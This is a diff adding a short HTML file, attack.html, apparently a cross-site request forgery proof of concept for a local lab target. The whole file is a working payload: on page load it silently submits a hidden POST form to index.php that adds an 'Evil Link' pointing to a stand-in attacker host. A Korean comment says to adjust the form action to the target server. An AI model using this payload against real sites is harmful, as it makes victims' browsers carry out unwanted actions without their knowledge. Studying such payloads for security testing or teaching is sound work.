@@ -1,0 +1,13 @@
+<!-- attack.html -->
+<!DOCTYPE html>
+<html>
+  <body onload="document.forms[0].submit()">
+    <!-- 대상 서버 주소에 맞춰 action 값을 지정 -->
+    <form action="http://localhost:8000/index.php" method="post">
+      <input type="hidden" name="section" value="Hacked">
+      <input type="hidden" name="title"   value="Evil Link">
+      <input type="hidden" name="url"     value="http://attacker.example">
+      <input type="hidden" name="add"     value="1">
+    </form>
+  </body>
+</html>
